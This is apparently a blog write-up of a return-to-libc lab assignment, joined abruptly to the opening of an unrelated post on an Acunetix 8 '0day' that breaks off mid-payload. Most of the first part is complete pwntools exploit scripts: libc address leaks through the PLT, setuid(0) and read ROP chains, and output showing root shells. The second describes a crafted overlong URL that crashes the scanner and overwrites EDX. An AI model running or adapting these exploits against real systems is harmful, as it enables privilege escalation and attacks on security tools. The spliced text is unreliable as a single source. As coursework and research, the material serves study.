onto the stack.\n8048554:    89 44 24 1c              mov    %eax,0x1c(%esp)\n8048558:    8b 44 24 1c              mov    0x1c(%esp),%eax\n804855c:    89 04 24                 mov    %eax,(%esp)\n804855f:    e8 59 ff ff ff           call   80484bd <bof>\nWithin the bof function, the function prologue pushes the current EBP\nonto the stack. This is the saved EBP. Next, 0x28 bytes are allocated\nfor the bof stack frame.\n80484bd:    55                       push   %ebp\n80484be:    89 e5                    mov    %esp,%ebp\n80484c0:    83 ec 28                 sub    $0x28,%esp\nIf we draw a diagram, one might notice that the buffer character buffer\nis given 16 bytes of space instead of 12 as per the declaration. This\nis due to GCC\u2019s alignment of variables to 8 bytes.\n1 1\nTask 1\nWhile the assignment brief indicates for the exploit to work under the\nabsence of the Address Space Layout Randomisation defense, this report\nwill offer an exploit that works in the presence of the defense as a\nchallenge. To do this, we will employ return to procedure linkage table\ntechniques to leak randomised addresses within libc.\nBlocking Stream Mechanism\nFirst, if we ran the program against an exploit badfile, it is\nimmediately apparent that there is no way to interact with the program\nwhile it is executing because all it does is read a file. Furthermore,\nif we take a look at the list of imported functions from libc, we do\nnot have a function in the procedure linkage table to perform reads\nfrom stdin to make it easy for a multiple stage exploit.\n$ objdump -t retlib | grep @@GLIBC\n00000000       F *UND*    00000000              fclose@@GLIBC_2.1\n00000000       F *UND*    00000000              fread@@GLIBC_2.0\n00000000       F *UND*    00000000              puts@@GLIBC_2.0\n00000000       F *UND*    00000000              __libc_start_main@@GLIBC_2.0\n00000000       F *UND*    00000000              fopen@@GLIBC_2.1\nFrom the above, fread is the only possible function that can be used to\nread data from the attacker. It has the following signature: fread(void\n*restrict ptr, size_t size, size_t nitems, FILE *restrict stream).\nUnfortunately, it would be remarkably difficult to obtain a valid FILE\npointer at the point of the overflow. Furthermore, we would probably\nhave to set up a fake stack with a larger read and a stack pivot\nbecause the ROP chain can only hold seven four-byte values.\nTo solve this problem, a unix mechanism called named pipes is used.\nNamed pipes are typically used to perform inter-process communication.\nTwo processes can open the named pipe, which exists as a file on the\nfile system. One end is used to write to the named pipe and the other\nreads from it.\nTo demonstrate, a named pipe can be created in the \/tmp\/ directory.\n\/tmp\/:$ mkfifo badfile\n\/tmp\/:$\nNext, the retlib binary is run. The binary blocks on input.\n\/tmp\/:$ \/vagrant\/assignment1\/retlib\nNext, a 101 bytes of data is written into the named pipe, which in turn\nis received by the retlib binary.\n\/tmp\/:$ python -c 'print \"A\"*100' > \/tmp\/badfile\n\/tmp\/:$\nBack in the retlib run, it crashes with a segmentation fault.\n$ \/vagrant\/assignment1\/retlib\nSegmentation fault (core dumped),\nThe important feature about the named pipe is that a process that\nsupplied the initial buffer overflow payload can continue to interact\nwith the retlib binary. This is exactly the behaviour desired when\nwriting a multistage exploit.\nTo begin with, we can create a skeleton exploit script to setup the\nnamed pipe and interact with the retlib binary.\nfrom pwn import *\nimport os\nimport posix\ndef main():\n# Get the absolute path to retlib\nretlib_path = os.path.abspath(\".\/retlib\")\n# Change the working directory to tmp and create a badfile\n# This is to avoid problems with the shared directory in vagrant\nos.chdir(\"\/tmp\")\n# Create a named pipe to interact reliably with the binary\ntry:\nos.unlink(\"badfile\")\nexcept:\npass\nos.mkfifo(\"badfile\")\n# Start the process\np = process(retlib_path)\n# Open a handle to the input named pipe\ncomm = open(\"badfile\", 'w', 0)\n# Setup the payload\npayload  = \"A\"*24\npayload += p32(0xdeadbeef)\npayload  = payload.ljust(52, \"\\x90\")\npayload  = xor(payload, 0xbe)\n# Send the payload\ncomm.write(payload)\np.interactive()\nif __name__ == \"__main__\":\nmain()\nDemonstrating that it works:\n$ python task1-skeleton.py\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[+] Starting local process '\/vagrant\/assignment1\/retlib': pid 6899\n[*] Switching to interactive mode\n[*] Got EOF while reading in interactive\n$\n[*] Process '\/vagrant\/assignment1\/retlib' stopped with exit code -11 (SIGSEGV)\n(pid 6899)\n[*] Got EOF while sending in interactive\n$ dmesg | tail -n 1\n[54468.527728] retlib[6899]: segfault at deadbeef ip deadbeef sp bfc08070 error\n15\nLeaking Libc Base\nNext, an address into libc has to be leaked before the randomised libc\nbase address can be calculated. Once the base address is known, the\naddress of any function in libc can be derived and used in the return\nto libc ROP chain. To do this, a technique called return to Procedure\nLinkage Table (ret2plt) is employed to leak these addresses.\nThe Procedure Linkage Table is used in conjunction with the Global\nOffset Table to implement dynamic linkage of shared libraries. For a\nfull description of how dynamic libraries work in ELF files, please\ntake a look at the following link:\n[34]https:\/\/www.technovelty.org\/linux\/plt-and-got-the-key-to-code-shari\nng-and-dynamic-libraries.html.\nA function call in the PLT begins with a PLT stub. The puts stub has\nthe following disassembly. It implements the lazy binding behaviour by\nbeginning the stub with a redirection in the form of a jmp *0x804a014.\n08048380 <puts@plt>:\n8048380:    ff 25 14 a0 04 08        jmp    *0x804a014\n8048386:    68 10 00 00 00           push   $0x10\n804838b:    e9 c0 ff ff ff           jmp    8048350 <_init+0x24>\nThe initial memory content of the 0x804a014 address is 0x08048386, the\naddress of one instruction after the jmp.\ngef\u27a4  x\/xw 0x804a014\n0x804a014 <[35][email protected]>:    0x08048386\nThe code initialises the address of puts in libc into the GOT before\nreturning. After the initialisation, the GOT entry now contains a\nrandomised libc address.\ngef\u27a4  x\/xw 0x804a014\n0x804a014 <[36][email protected]>:    0xb75d47e0\ngef\u27a4  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x \/vagrant\/assignment1\/retlib\n0x08049000 0x0804a000 0x00000000 r-- \/vagrant\/assignment1\/retlib\n0x0804a000 0x0804b000 0x00001000 rw- \/vagrant\/assignment1\/retlib\n0x09520000 0x09541000 0x00000000 rw- [heap]\n0xb756e000 0xb756f000 0x00000000 rw-\n0xb756f000 0xb771a000 0x00000000 r-x \/lib\/i386-linux-gnu\/libc-2.19.so\n0xb771a000 0xb771c000 0x001aa000 r-- \/lib\/i386-linux-gnu\/libc-2.19.so\n0xb771c000 0xb771d000 0x001ac000 rw- \/lib\/i386-linux-gnu\/libc-2.19.so\n0xb771d000 0xb7720000 0x00000000 rw-\n0xb7728000 0xb772b000 0x00000000 rw-\n0xb772b000 0xb772c000 0x00000000 r-x [vdso]\n0xb772c000 0xb774c000 0x00000000 r-x \/lib\/i386-linux-gnu\/ld-2.19.so\n0xb774c000 0xb774d000 0x0001f000 r-- \/lib\/i386-linux-gnu\/ld-2.19.so\n0xb774d000 0xb774e000 0x00020000 rw- \/lib\/i386-linux-gnu\/ld-2.19.so\n0xbfb11000 0xbfb32000 0x00000000 rw- [stack]\ngef\u27a4\nThus, if we call puts in PLT with the address of puts in the GOT, we\ncan leak the resolved libc address. The following code snippet creates\na ROP chain to puts the libc address of puts and then crash. The python\nscript will receive the leaked address in stdout, unpack the raw bytes\ninto a 32 bit integer value, and display it.\n...\nputs_plt = 0x08048380\nputs_got = 0x804a014\n...\n# Create the rop chain\nrop  = p32(puts_plt)\nrop += p32(0xdeadbeef)\nrop += p32(puts_got)\n...\n# Get leak of puts in libc\nleak = p.recv(4)\nputs_libc = u32(leak)\nlog.info(\"puts@libc: 0x%x\" % puts_libc)\np.clean()\n...\nThe next step would be to obtain some important offsets of values and\nfunctions within the raw libc shared object to calculate the libc base\nand other useful libc functions. To do this, we can use the\nlibc-database tool by Niklas Baumstark\n([37]https:\/\/github.com\/niklasb\/libc-database).\n$ ldd \/vagrant\/assignment1\/retlib\nlinux-gate.so.1 =>  (0xb77d0000)\nlibc.so.6 => \/lib\/i386-linux-gnu\/libc.so.6 (0xb7614000)\n\/lib\/ld-linux.so.2 (0xb77d1000)\n$ .\/identify \/lib\/i386-linux-gnu\/libc.so.6\nid libc6_2.19-0ubuntu6.13_i386\n$ .\/dump libc6_2.19-0ubuntu6.13_i386\noffset___libc_start_main_ret = 0x19af3\noffset_system = 0x00040310\noffset_dup2 = 0x000ddd80\noffset_read = 0x000dd3c0\noffset_write = 0x000dd440\noffset_str_bin_sh = 0x162cec\noffset_setuid = 0x000b91a0\noffset_puts = 0x000657e0\noffset_exit = 0x00033260\nNow, a small addition to the python script would allow us to make some\nimportant calculations.\n# Calculate the required libc functions\nlibc_base = puts_libc - offset_puts\nsystem_addr = libc_base + offset_system\nbinsh_addr = libc_base + offset_str_bin_sh\nexit_addr = libc_base + offset_exit\nRunning the updated script:\n$ python task1-leak.py\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[+] Starting local process '\/vagrant\/assignment1\/retlib': pid 9376\n[*] puts@libc: 0xb76837e0\n[*] libc base: 0xb761e000\n[*] system@libc: 0xb765e310\n[*] binsh@libc: 0xb7780cec\n[*] exit@libc: 0xb7651260\n[*] Switching to interactive mode\n[*] Got EOF while reading in interactive\n$\n[*] Process '\/vagrant\/assignment1\/retlib' stopped with exit code -11 (SIGSEGV)\n(pid 9376)\n[*] Got EOF while sending in interactive\nSecond Stage Payload\nNow that we have the libc addresses of system, exit, and the string\n\"\/bin\/sh\", we can craft a ROP chain for the second stage payload.\nHowever, we need a way to get the second stage ROP chain executed. The\nsimplest solution to this is to loop back into the main function which\nwould re-trigger the vulnerability with the new faked stack frames.\n...\n# Create the rop chain\nrop  = p32(puts_plt)\nrop += p32(main_addr)\nrop += p32(puts_got)\n# Create and encode the payload\npayload = \"A\"*24 + rop\npayload = payload.ljust(52, \"\\x90\")\npayload = xor(payload, 0xbe)\n# Launch the first stage of the attack\ncomm.write(payload)\nlog.info(\"Stage 1 sent!\")\n...\n# Create the rop chain for stage 2\nrop2  = p32(system_addr)\nrop2 += p32(exit_addr)\nrop2 += p32(binsh_addr)\n# Create and encode the payload for stage 2\npayload2 = \"A\"*24 + rop2\npayload2 = payload2.ljust(52, \"\\x90\")\npayload2 = xor(payload2, 0xbe)\n# Launch the second stage of the attack\ncomm.write(payload2)\nlog.info(\"Stage 2 sent!\")\n...\nFinal Exploit\nThe final exploit script for task 1:\nfrom pwn import *\nimport os\nimport posix\n#context.log_level = \"debug\"\nputs_plt = 0x08048380\nfread_plt = 0x08048370\nputs_got = 0x804a014\npopret = 0x0804834d\nmain_addr = 0x8048537\noffset___libc_start_main_ret = 0x19af3\noffset_system = 0x00040310\noffset_dup2 = 0x000ddd80\noffset_read = 0x000dd3c0\noffset_write = 0x000dd440\noffset_str_bin_sh = 0x162cec\noffset_setuid = 0x000b91a0\noffset_puts = 0x000657e0\noffset_exit = 0x00033260\ndef main():\n# Get the absolute path to retlib\nretlib_path = os.path.abspath(\".\/retlib\")\n# Change the working directory to tmp and create a badfile\n# This is to avoid problems with the shared directory in vagrant\nos.chdir(\"\/tmp\")\n# Create a named pipe to interact reliably with the binary\ntry:\nos.unlink(\"badfile\")\nexcept:\npass\nos.mkfifo(\"badfile\")\n# Create the rop chain\nrop  = p32(puts_plt)\nrop += p32(main_addr)\nrop += p32(puts_got)\n# Create and encode the payload\npayload = \"A\"*24 + rop\npayload = payload.ljust(52, \"\\x90\")\npayload = xor(payload, 0xbe)\n# Start the process\np = process(retlib_path)\n# Open a handle to the input named pipe\ncomm = open(\"badfile\", 'w', 0)\n# Launch the first stage of the attack\ncomm.write(payload)\nlog.info(\"Stage 1 sent!\")\n# Get leak of puts in libc\nleak = p.recv(4)\nputs_libc = u32(leak)\nlog.info(\"puts@libc: 0x%x\" % puts_libc)\np.clean()\n# Calculate the required libc functions\nlibc_base = puts_libc - offset_puts\nsystem_addr = libc_base + offset_system\nbinsh_addr = libc_base + offset_str_bin_sh\nexit_addr = libc_base + offset_exit\nlog.info(\"libc base: 0x%x\" % libc_base)\nlog.info(\"system@libc: 0x%x\" % system_addr)\nlog.info(\"binsh@libc: 0x%x\" % binsh_addr)\nlog.info(\"exit@libc: 0x%x\" % exit_addr)\n# Create the rop chain for stage 2\nrop2  = p32(system_addr)\nrop2 += p32(exit_addr)\nrop2 += p32(binsh_addr)\n# Create and encode the payload for stage 2\npayload2 = \"A\"*24 + rop2\npayload2 = payload2.ljust(52, \"\\x90\")\npayload2 = xor(payload2, 0xbe)\n# Launch the second stage of the attack\ncomm.write(payload2)\nlog.info(\"Stage 2 sent!\")\nlog.success(\"Enjoy your shell.\")\np.interactive()\nif __name__ == \"__main__\":\nmain()\nRunning the completed script:\n$ python \/vagrant\/assignment1\/task1-exploit.py\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[+] Starting local process '\/home\/vagrant\/retlib': pid 9447\n[*] Stage 1 sent!\n[*] puts@libc: 0xb76307e0\n[*] libc base: 0xb75cb000\n[*] system@libc: 0xb760b310\n[*] binsh@libc: 0xb772dcec\n[*] exit@libc: 0xb75fe260\n[*] Stage 2 sent!\n[+] Enjoy your shell.\n[*] Switching to interactive mode\n$ whoami\nroot\n$ id\nuid=1000(vagrant) gid=1000(vagrant) euid=0(root) groups=0(root),1000(vagrant)\n$ exit\n[*] Got EOF while reading in interactive\n$\n[*] Process '\/home\/vagrant\/retlib' stopped with exit code 144 (pid 9447)\nTask 2\nIn task 2, we have to execute system(\"\/bin\/bash\") in the ROP chain.\nHowever, the caveat is that \/bin\/bash drops root privileges so the\nshell that gets spawned only has user level privileges. To get around\nthis, setuid(0) has to be executed to set the effective user ID before\ncalling system.\nA second caveat is that the string \"\/bin\/bash\" does not exist within\nthe retlib binary or the libc shared library. Thus, we would need to\nread the string into memory at some writable address.\nTo surmise, the following series of actions must be taken:\n1. Leak the libc addresses\n2. setuid(0)\n3. Read \"\/bin\/bash\" into memory\n4. system(\"\/bin\/bash\")\nLibc Address Leak\nFirst, we leak the puts libc address as per task 1 and calculate a few\nmore important function addresses that we need for the entire task.\n# Calculate the required libc functions\nlibc_base = puts_libc - offset_puts\nsystem_addr = libc_base + offset_system\nbinsh_addr = libc_base + offset_str_bin_sh\nsetuid_addr = libc_base + offset_setuid\nexit_addr = libc_base + offset_exit\nread_addr = libc_base + offset_read\nwritable_addr = libc_base + offset_writable\nlog.info(\"libc base: 0x%x\" % libc_base)\nlog.info(\"system@libc: 0x%x\" % system_addr)\nlog.info(\"setuid@libc: 0x%x\" % setuid_addr)\nlog.info(\"exit@libc: 0x%x\" % exit_addr)\nlog.info(\"read@libc: 0x%x\" % read_addr)\nlog.info(\"writable address in libc: 0x%x\" % writable_addr)\nPop Ret ROP Gadgets\nNext, we need Pop Ret gadgets, a class of ROP gadgets that aid with ROP\nchains that use functions with multiple arguments. The gadgets pop\nvalues off the stack to move the stack pointer in the right position to\nthe next fake stack frame.\nTo do this, the ropper binary can be used to search for these\naddresses:\n$ ropper --file retlib --search \"pop %\"\n[INFO] Load gadgets from cache\n[LOAD] removing double gadgets... 100%\n[INFO] Searching for gadgets: pop %\n[INFO] File: retlib\n0x08048441: pop ds; add eax, edx; sar eax, 1; jne 0x449; ret;\n0x080485ef: pop ebp; ret;\n0x080485ec: pop ebx; pop esi; pop edi; pop ebp; ret;\n0x0804834d: pop ebx; ret;\n0x080485ee: pop edi; pop ebp; ret;\n0x080485ed: pop esi; pop edi; pop ebp; ret;\nWe need a pop ret gadget and a pop pop pop ret gadget. Thus, we pick\n0x0804834d and 0x080485ed.\nSetting the User ID\nWe split up the actions we have to take into multiple stages. The ROP\nchain to call setuid(0) is as follows:\n# Create the rop chain for stage 2\nrop2  = p32(setuid_addr)\nrop2 += p32(popret)\nrop2 += p32(0)\nrop2 += p32(main_addr)\n# Create and encode the payload for stage 2\npayload2 = \"A\"*24 + rop2\npayload2 = payload2.ljust(52, \"\\x90\")\npayload2 = xor(payload2, 0xbe)\n# Launch the second stage of the attack\ncomm.write(payload2)\nlog.info(\"Stage 2 sent!\")\nReading Bash String into Memory\nTo get the string \"\/bin\/bash\" into memory, we find a valid address to\nwrite to in libc. The offset 0x1ad050 into libc is writable and so we\npick that. Now, we can craft a ROP chain that calls read(0, 0x1ad050,\n10) to read 10 bytes from stdin.\n# Create the rop chain for stage 3\nrop3  = p32(read_addr)\nrop3 += p32(pppret)\nrop3 += p32(0)\nrop3 += p32(writable_addr)\nrop3 += p32(10)\nrop3 += p32(main_addr)\n# Create and encode the payload for stage 3\npayload3 = \"A\"*24 + rop3\npayload3 = payload3.ljust(52, \"\\x90\")\npayload3 = xor(payload3, 0xbe)\n# Launch the third stage of the attack\ncomm.write(payload3)\nlog.info(\"Stage 3 sent!\")\n# Provide the \/bin\/bash string\np.send(\"\/bin\/bash\\x00\")\nlog.info(\"\\\"\/bin\/bash\\\": 0x%x\" % writable_addr)\nCalling System\nThe ROP chain to call system(\"\/bin\/bash\") is almost identical to the\none in task 1.\n# Create the rop chain for stage 4\nrop4  = p32(system_addr)\nrop4 += p32(exit_addr)\nrop4 += p32(writable_addr)\n# Create and encode the payload for stage 4\npayload4 = \"A\"*24 + rop4\npayload4 = payload4.ljust(52, \"\\x90\")\npayload4 = xor(payload4, 0xbe)\n# Launch the fourth stage of the attack\ncomm.write(payload4)\nlog.info(\"Stage 4 sent!\")\nFinal Exploit\nThe final exploit script for task 2:\nfrom pwn import *\nimport os\nimport posix\n#context.log_level = \"debug\"\nputs_plt = 0x08048380\nfread_plt = 0x08048370\nputs_got = 0x804a014\npopret = 0x0804834d\npppret = 0x80485ed\nmain_addr = 0x8048537\noffset___libc_start_main_ret = 0x19af3\noffset_system = 0x00040310\noffset_dup2 = 0x000ddd80\noffset_read = 0x000dd3c0\noffset_write = 0x000dd440\noffset_str_bin_sh = 0x162cec\noffset_setuid = 0x000b91a0\noffset_puts = 0x000657e0\noffset_exit = 0x00033260\noffset_writable = 0x1ad050\ndef main():\n# Get the absolute path to retlib\nretlib_path = os.path.abspath(\".\/retlib\")\n# Change the working directory to tmp and create a badfile\n# This is to avoid problems with the shared directory in vagrant\nos.chdir(\"\/tmp\")\n# Create a named pipe to interact reliably with the binary\ntry:\nos.unlink(\"badfile\")\nexcept:\npass\nos.mkfifo(\"badfile\")\n# Create the rop chain\nrop  = p32(puts_plt)\nrop += p32(main_addr)\nrop += p32(puts_got)\n# Create and encode the payload\npayload = \"A\"*24 + rop\npayload = payload.ljust(52, \"\\x90\")\npayload = xor(payload, 0xbe)\n# Start the process\np = process(retlib_path)\n# Open a handle to the input named pipe\ncomm = open(\"badfile\", 'w', 0)\n# Launch the first stage of the attack\ncomm.write(payload)\nlog.info(\"Stage 1 sent!\")\n# Get leak of puts in libc\nleak = p.recv(4)\nputs_libc = u32(leak)\nlog.info(\"puts@libc: 0x%x\" % puts_libc)\np.clean()\n# Calculate the required libc functions\nlibc_base = puts_libc - offset_puts\nsystem_addr = libc_base + offset_system\nbinsh_addr = libc_base + offset_str_bin_sh\nsetuid_addr = libc_base + offset_setuid\nexit_addr = libc_base + offset_exit\nread_addr = libc_base + offset_read\nwritable_addr = libc_base + offset_writable\nlog.info(\"libc base: 0x%x\" % libc_base)\nlog.info(\"system@libc: 0x%x\" % system_addr)\nlog.info(\"setuid@libc: 0x%x\" % setuid_addr)\nlog.info(\"exit@libc: 0x%x\" % exit_addr)\nlog.info(\"read@libc: 0x%x\" % read_addr)\nlog.info(\"writable address in libc: 0x%x\" % writable_addr)\n# Create the rop chain for stage 2\nrop2  = p32(setuid_addr)\nrop2 += p32(popret)\nrop2 += p32(0)\nrop2 += p32(main_addr)\n# Create and encode the payload for stage 2\npayload2 = \"A\"*24 + rop2\npayload2 = payload2.ljust(52, \"\\x90\")\npayload2 = xor(payload2, 0xbe)\n# Launch the second stage of the attack\ncomm.write(payload2)\nlog.info(\"Stage 2 sent!\")\n# Create the rop chain for stage 3\nrop3  = p32(read_addr)\nrop3 += p32(pppret)\nrop3 += p32(0)\nrop3 += p32(writable_addr)\nrop3 += p32(10)\nrop3 += p32(main_addr)\n# Create and encode the payload for stage 3\npayload3 = \"A\"*24 + rop3\npayload3 = payload3.ljust(52, \"\\x90\")\npayload3 = xor(payload3, 0xbe)\n# Launch the third stage of the attack\ncomm.write(payload3)\nlog.info(\"Stage 3 sent!\")\n# Provide the \/bin\/bash string\np.send(\"\/bin\/bash\\x00\")\nlog.info(\"\\\"\/bin\/bash\\\": 0x%x\" % writable_addr)\n# Create the rop chain for stage 4\nrop4  = p32(system_addr)\nrop4 += p32(exit_addr)\nrop4 += p32(writable_addr)\n# Create and encode the payload for stage 4\npayload4 = \"A\"*24 + rop4\npayload4 = payload4.ljust(52, \"\\x90\")\npayload4 = xor(payload4, 0xbe)\n# Launch the fourth stage of the attack\ncomm.write(payload4)\nlog.info(\"Stage 4 sent!\")\nlog.success(\"Enjoy your shell.\")\np.interactive()\nif __name__ == \"__main__\":\nmain()\nRunning the exploit:\n$ python \/vagrant\/assignment1\/task2-exploit.py\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[+] Starting local process '\/home\/vagrant\/retlib': pid 11111\n[*] Stage 1 sent!\n[*] puts@libc: 0xb76217e0\n[*] libc base: 0xb75bc000\n[*] system@libc: 0xb75fc310\n[*] setuid@libc: 0xb76751a0\n[*] exit@libc: 0xb75ef260\n[*] read@libc: 0xb76993c0\n[*] writable address in libc: 0xb7769050\n[*] Stage 2 sent!\n[*] Stage 3 sent!\n[*] \"\/bin\/bash\": 0xb7769050\n[*] Stage 4 sent!\n[+] Enjoy your shell.\n[*] Switching to interactive mode\n$ id\nuid=0(root) gid=1000(vagrant) groups=0(root),1000(vagrant)\n$\nTask 3\nAddress Space Layout Randomisation\nSince the exploit works by leaking libc address from the Global Offset\nTable, Address Space Layout Randomisation does not mitigate it. Thus,\nrunning the exploit in task 1 results in a successful shell.\n$ cat \/proc\/sys\/kernel\/randomize_va_space\n2\n$ python \/vagrant\/assignment1\/task1-exploit.py\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[+] Starting local process '\/home\/vagrant\/retlib': pid 9721\n[*] Stage 1 sent!\n[*] puts@libc: 0xb76527e0\n[*] libc base: 0xb75ed000\n[*] system@libc: 0xb762d310\n[*] binsh@libc: 0xb774fcec\n[*] exit@libc: 0xb7620260\n[*] Stage 2 sent!\n[+] Enjoy your shell.\n[*] Switching to interactive mode\n$ id\nuid=1000(vagrant) gid=1000(vagrant) euid=0(root) groups=0(root),1000(vagrant)\n$\n[*] Stopped process '\/home\/vagrant\/retlib' (pid 9721)\nStack Canaries\nSince the vulnerability stems from a buffer overrun, introducing a\nstack canary to detect corruption of the stack frame will prevent the\nattacker from controlling the instruction pointer without having an\ninformation leak. The exploit in task 1 has no such capability and\nthus, will fail.\nUnfortunately, the binary does not grant such an information leak so\nthere is no way to write a reliable exploit to get a shell.\n$ checksec retlib-canary\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[*] '\/home\/vagrant\/retlib-canary'\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n$ python \/vagrant\/assignment1\/task3-exploit-canary.py\n[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.\n[+] Starting local process 'retlib-canary': pid 9883\n[*] Stage 1 sent!\n[*] puts@libc: 0x202a2a2a\n[*] libc base: 0x2023d24a\n[*] system@libc: 0x2027d55a\n[*] binsh@libc: 0x2039ff36\n[*] exit@libc: 0x202704aa\n[*] Stage 2 sent!\n[+] Enjoy your shell.\n[*] Switching to interactive mode\nstack smashing detected ***: \/home\/vagrant\/retlib-canary terminated\nAborted (core dumped)\n[*] Process 'retlib-canary' stopped with exit code 134 (pid 9883)\n[*] Got EOF while reading in interactive\n$\nTags: [38]pwn, [39]return-to-libc, [40]vulnresearch\nUpdated: October 02, 2017\nShare on\n[41]Twitter [42]Facebook [43]Google+ [44]LinkedIn\n[45]Previous [46]Next\nLeave a Comment\nYou May Also Enjoy\n[47]Cyberpeace 2022 - Crysys (Pwn)\n5 minute read\nSummary: A minimal binary with only the read libc function and\ncontaining a standard stack overflow can be exploited by leveraging a\ncommon add-what-where ga...\n[48]TetCTF 2022 - Newbie (Pwn)\n6 minute read\nSummary: An ELF binary contains functionality to generate a \u2018hashed\u2019\nidentifier from two bytes of memory at an offset specified by the user.\nThis \u2018hashed\u2019 id...\n[49]TetCTF 2022 - EzFlag (Web\/Pwn)\n14 minute read\nSummary: In this two part challenge, flawed filename logic allows an\nattacker to write arbitrary Python files that are executed as a CGI\nscript. Once the att...\n[50]Sieberrsec 3.0 CTF (2021) - Turbo Fast Crypto (Crypto\/Pwn)\n11 minute read\nSummary: An insecurely implemented Python native library allows for an\nattacker to exfiltrate the XOR key used to \u2018encrypt\u2019 arbitrary data as\nwell as contain...\n* Follow:\n* [51]Twitter\n* [52]GitHub\n* [53]Gitlab\n* [54]Feed\n\u00a9 2022 amon. Powered by [55]Jekyll & [56]Minimal Mistakes.\nPlease enable JavaScript to view the [57]comments powered by Disqus."}
{"text":"#[1]An7i Security - Atom [2]An7i Security - RSS [3]An7i Security - Atom\n[4]An7i Security\nApr 23, 2014\nPwn the n00bs - Acunetix 0day\nA few weeks ago I have published an article about WINRAR 0DAY.\nThat article revealed a new vulnerability that gave attackers, the\nability to perform spoofing attack.\nMany people wrote to me about the problems of that kind of article\n([5]for example).\nSo this time I\u2019m goanna reveal a new 0DAY that will help security\nmanagers to protect their web sites against many vulnerability scans.\nA lot of sites owners will tell you that the majority numbers of scans,\nperformed against their sites, are performed by automatic tools like\nNESSUS, ACUNETIX, and APPSCAN.\nToday 0DAY will be focused on one of the most popular web scan in the\nworld, ACUNETIX.\nThe POC will be against ACUNETIX 8 (build 20120704 since it\u2019s one of\nthe most common cracked version which was published in the net and used\nby many newbie hackers).\nThis disclosure will not only reveal a new vulnerability, but\ndemonstrates a whole new perception of dealing with external attacks.\nInstead of protecting your web sites again and again, or buying a new\nadvanced WAF (web application firewall), let\u2019s give the attackers a\nreason to be afraid, reason to think twice before they press the \u201cSCAN\u201d\nbutton.\nIn this article, I will not give a full working exploit for all scan\nscenarios nor for all operating systems, but a proof of concept that\nhopefully will grow into a new effort of research for vulnerabilities\nin Penetration test tools.\nSo let\u2019s get our hands dirty\n[6][Acunetix+Web+Vulnerability+Scanner.jpg]\nACUNETIX is a powerful tool for scanning and finding vulnerabilities at\nwebsites.\nMany newbie attackers tend to use this tool due to the simplicity of\nits use.\nACUNETIX offers its users a simple wizard base scan that covers many\naspects of the vulnerability scan.\nOne of the aspects is the ability to scan more domains or sub domains\nrelated to the scanned website.\nFor example, if we scan my blog \u201chttp:\/\/an7isec.blogspot.co.il\u201d, we\nwill get the result shown below:\n[7][acunetix1.png]\nAfter a little research about this option, I figured out that ACUNETIX\nstarts its wizard by sending an HTTP request to the site and learning\nabout it from its HTTP response.\nFurthermore the wizard learns about the external related domains from\nthe external sources that appear at the website, for example:\n\u201c<img src=http:\/\/externalSource.com\/someimg.png >\u201d\n\u201c<a href=http:\/\/externalSource.com\/ ><\/a>\u201d\nEtc...\nFurther Analysis reveals that if one of the external domain name length\nis more than 268 Byte\u2019s, ACUNETIX will be crashed , so if we want to\ncause a crash, all we need to do is to put some kind of external source\nat our site, which have the length of 268 Byte\u2019s or more, say something\nlike this:\n<A href= \u201chttp:\/\/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAA\u201d>\nQuick view of this application in Immunity Debugger reveals that EDX\nwas corrupted by the fuzzing string which caused access violation:\n[8][access.png]\nDespite the fact that further writing runs over the Structured Exaction\nHandler (SEH) as you will probably notice ,my advice for you is not to\ngo that way, believe me I tried it for several days with no success\n(because of the safe SHE mechanism).\nHowever, we have another problem with this  exploit, In one word,\n\u201cASCII\u201d.\nACUNETIX gets its information about external domains as a URL.\nThis fact causing the string to be converted into Web Browser friendly\nstring.\nWhile ASCII accepts chars like:\n0x22 (\u201c), 0x23 (#), 0x24 ($), 0x25 (%), 0x5C (\\), 0x2F (\/) and more \u2026\nURL string accepts only printable alphanumeric chars and URL converted\nspecial chars (with few exceptions).\nSo if my external source contains one of the special chars, they will\nbe converted into\n\u201d%SOMETHING\u201d.\nFor example, the char \"quotes\" (\u201c) will be converted into 253232 in the\nmemory because it\u2019s the translation of %22.\nAnother example that demonstrates the URL encoding is: the char\n\"percent\" (%)  which will be converted into 253235 in the memory.\nBypassing it, will be by building an exploit that contains only \"A-Z,\na-z, 1-0\" chars and few special chars that aren\u2019t converted in the\nprocess of URL ENCODE like:\n\"! ( ) = } { \" .\n(not a simple job at all)\nIn short, I had to find a way to fix the flow of the application in\norder to avoid SEH based exploit (Because it was impossible to bypass\nsafe SHE protection with URL ASCII strings only).\nFinally, I found a way.\nIn order to fix the flow, EDX had to be overwritten with a readable\nmemory address.\nNevertheless, it is important to remember that EDX is not been used as\nis, but minus 8:\nMOVE ECX, DWORD PTR DS: [EDX-8];\nMeaning that it doesn\u2019t matter which memory address we use, we should\nadd 8 to the address (in the exploit), convert the whole address into\nprintable URL STRING, and hope to the best.\nAfter little research, I found such an address.\nThe address was at \u201c0x663030XX\u201d and luckily it had the possibility to\nbe converted into URL String without special bad char's --> \" f005 \".\nAfter playing with the code I found that the exact location of that EDX\noverwrite, is at 268 Byte's offset.\nSo for now our exploit looks like this:\n<img 